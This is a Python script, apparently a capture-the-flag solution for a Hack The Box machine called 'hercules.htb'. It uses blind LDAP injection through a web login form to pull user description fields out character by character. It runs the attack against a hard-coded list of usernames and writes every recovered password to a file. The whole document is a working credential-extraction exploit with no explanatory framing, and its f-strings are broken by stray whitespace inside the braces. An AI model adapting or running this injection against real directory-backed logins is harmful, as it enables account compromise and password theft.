#!/usr/bin/env python3
import requests
import string
import urllib3
import re
import time

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
LOGIN_PAGE = "/login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False

# Success indicator (valid user, wrong password)
SUCCESS_INDICATOR = "Login attempt failed"

# Token regex
TOKEN_RE = re.compile(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', re.IGNORECASE)

# All enumerated users (replaced as requested)
KNOWN_USERS = ["adriana.i","angelo.o","ashley.b","bob.w","camilla.b","clarissa.c","elijah.m","fiona.c","harris.d","heather.s","jacob.b","jennifer.a","jessica.e","joel.c","johanna.f","johnathan.j","ken.w","mark.s","mikayla.a","natalie.a","nate.h","patrick.s","ramona.l","ray.n","rene.s","shae.j","stephanie.w","stephen.m","tanya.r","tish.c","vincent.g","will.s","zeke.s","auditor"]

def get_token_and_cookie(session):
    response = session.get(BASE + LOGIN_PAGE, verify=VERIFY_TLS)
    token = None
    match = TOKEN_RE.search(response.text)
    if match:
        token = match.group(1)
    return token

def test_ldap_injection(username, description_prefix=""):
    session = requests.Session()
    # Get fresh token
    token = get_token_and_cookie(session)
    if not token:
        return False

    # Build LDAP injection payload
    if description_prefix:
        # Escape special characters
        escaped_desc = description_prefix
        if '*' in escaped_desc:
            escaped_desc = escaped_desc.replace('*', '\\2a')
        if '(' in escaped_desc:
            escaped_desc = escaped_desc.replace('(', '\\28')
        if ')' in escaped_desc:
            escaped_desc = escaped_desc.replace(')', '\\29')
        payload = f"{
      
        username}*)(description={
      
        escaped_desc}*"
    else:
        # Check if user has description field
        payload = f"{
      
        username}*)(description=*"

    # Double URL encode
    encoded_payload = ''.join(f'%{
      
        byte:02X}' for byte in payload.encode('utf-8'))

    data = {
    
      
        "Username": encoded_payload,
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": token
    }

    try:
        response = session.post(TARGET_URL, data=data, verify=VERIFY_TLS, timeout=5)
        return SUCCESS_INDICATOR in response.text
    except Exception as e:
        return False

def enumerate_description(username):
    # Character set - most common password chars first for optimization
    charset = (
        string.ascii_lowercase +
        string.digits +
        string.ascii_uppercase +
        "!@#$_*-." + # Common special chars
        "%^&()=+[]{}|;:',<>?/`~\" \\" # Less common
    )

    print(f"\n[*] Checking user: {
      
        username}")

    # First check if user has description
    if not test_ldap_injection(username):
        print(f"[-] User {
      
        username} has no description field")
        return None

    print(f"[+] User {
      
        username} has a description field, enumerating...")
    description = ""
    max_length = 50
    no_char_count = 0

    for position in range(max_length):
        found = False
        for char in charset:
            test_desc = description + char
            if test_ldap_injection(username, test_desc):
                description += char
                print(f" Position {
      
        position}: '{
      
        char}' -> Current: {
      
        description}")
                found = True
                no_char_count = 0
                break
            # Small delay to avoid rate limiting
            time.sleep(0.01)

        if not found:
            no_char_count += 1
            if no_char_count >= 2: # Stop after 2 positions with no chars
                break

    if description:
        print(f"[+] Complete: {
      
        username} => {
      
        description}")
        return description
    return None

def main():
    print("="*60)
    print("Hercules LDAP Description/Password Enumeration")
    print(f"Testing {
      
        len(KNOWN_USERS)} users")
    print("="*60)

    found_passwords = {
    
      }

    # Priority users to test first
    priority_users = ["web_admin", "auditor", "Administrator", "natalie.a", "ken.w"]
    other_users = [u for u in KNOWN_USERS if u not in priority_users]

    # Test priority users first
    for user in priority_users + other_users:
        password = enumerate_description(user)
        if password:
            found_passwords[user] = password
            # Save results immediately
            with open("hercules_passwords.txt", "a") as f:
                f.write(f"{
      
        user}:{
      
        password}\n")
            print(f"\n[+] FOUND: {
      
        user}:{
      
        password}\n")

    print("\n" + "="*60)
    print("ENUMERATION COMPLETE")
    print("="*60)

    if found_passwords:
        print(f"\nFound {
      
        len(found_passwords)} passwords:")
        for user, pwd in found_passwords.items():
            print(f" {
      
        user}: {
      
        pwd}")
    else:
        print("\nNo passwords found")

if __name__ == "__main__":
    main()

